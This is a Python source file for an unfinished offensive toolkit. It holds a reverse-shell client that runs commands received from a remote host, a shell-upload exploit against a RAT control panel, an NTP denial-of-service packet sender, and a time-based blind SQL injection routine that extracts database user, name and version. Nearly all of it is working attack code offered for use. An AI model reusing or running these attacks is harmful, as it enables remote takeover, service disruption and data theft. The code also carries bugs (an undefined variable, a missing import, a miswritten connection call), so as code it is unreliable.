import socket
import subprocess
import sys
import string
import time
import datetime
import requests
from Webcrawler import WebCrawler


colors = {
    'BLUE': '\33[1;94m',
    'RED': '\033[1;91m',
    'WHITE': '\33[1;97m',
    'YELLOW': '\33[1;93m',
    'MAGENTA': '\033[1;35m',
    'GREEN': '\033[1;32m',
    'END': '\033[0m',
}


class PayLoads(WebCrawler):

    global colors
    # Under construction (Having problems debugging)

    def __init__(self, base_url, host, port=4444):
        super().__init__(base_url)
        self.host = host
        self.port = port

    def connection(self):
        sockObj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sockObj.connect((self.host, self.port))

        return sockObj

    def await(self, sockObj):
        data = sockObj.recv(2048)

        if data == "exit\n":
            sockObj.close()
            sys.exit()
        # nothing
        elif len(data) == 0:
            return True
        else:
            process = subprocess.Popen(
                data, shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
                )
            stdout = process.stdout.read() + process.stderr.read()
            sockObj.send(stdout)
            return False

    def run(self):
        while True:
            dead = False
            try:
                sockObj = connection((self.host, self.port))
                while not dead:
                    dead = await(sockObj)
                sockObj.close()
            except Exception as e:
                print(colors["RED"], "Error ", e, colors["END"])

    # TorCT RAT C&C Panel Shell Upload Exploit
    # Credits -->  Darren Martyn
    def upload_shell(url, shell="/your/shell.php"):
        try:
            files = {
                'file': open(shell, "rb")
            }

            req = requests.post(url=url, files=files)
        except Exception as e:
            print(colors["RED"], "---\t FAILED \t---", colors["END"])
            print("Error ", e)

        if "File is successfully stored!" in req.text:
            print(colors["GREEN"], "[+] Shell Uploaded!", colors["END"])
            print(colors["MAGENTA"], "It should be in {}".format(url.replace("upload.php", "Upload/%s"%(os.path.basename(shell)))), colors["END"])
        else:
            sys.exit()


class NTP_DOS(WebCrawler):

    global colors

    def payload_transmittor(host, port):
        payload = "\x16\x0a\x00\x10\x00\x00\x00\x00\x00\x00\x00\x36\x6e\x6f\x6e\x63\x65\x2c\x20\x6c\x61\x64\x64\x72\x3d\x5b\x5d\x3a\x48\x72\x61\x67\x73\x3d\x33\x32\x2c\x20\x6c\x61\x64\x64\x72\x3d\x5b\x5d\x3a\x57\x4f\x50\x00\x32\x2c\x20\x6c\x61\x64\x64\x72\x3d\x5b\x5d\x3a\x57\x4f\x50\x00\x00"
        print(colors["BLUE"], "[-] Sending payload to {}:{}".format(host, port), colors["END"])
        sockObj = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sockObj.sendto(payload, (host, port))
            print("[+] Payload Delivered. ")
        except:
            print(colors["RED"], "Couldn't Deliver The Payload.", colors["END"])
            sys.exit()


class SQL_injection(WebCrawler):

    global colors

    def __init__(self, url):
        self.url = url

    def attack(self):
        # make payload (try out chars)
        print(colors["BLUE"], "[-] Loading attack.", colors["END"])
        payload = list(string.ascii_lowercase)
        more_chars = ["_", ".", "@", ",", "-"]
        more_nums = [str(num) for num in range(0, 10)]
        for i in more_chars:
            payload.append(i)
        for j in more_nums:
            payload.append(j)
        maxlen = 30
        xplt = []
        for i in range(maxlen):
            for elem in payload:
                t_initial = time.time()
                poc = self.url + " union select if((ord(SUBSTR(concat_ws(' ---- ',user(),database(),version()),"+str(i+1)+",1))=ord('"+element+"'))=1,sleep(0),sleep(0.5)),2,3"
                res = requests.get(poc)
                if res.status_code == 200:  # Successful
                    t_final = time.time()
                    total = t_final - t_initial
                    if total < 0.5:
                        xplt.append(elem)
                        print("".join(xplt)+"...")
                        continue

        print(colors["MAGENTA"], "[+] DONE!", colors["END"])
# NOT YET FINISHED
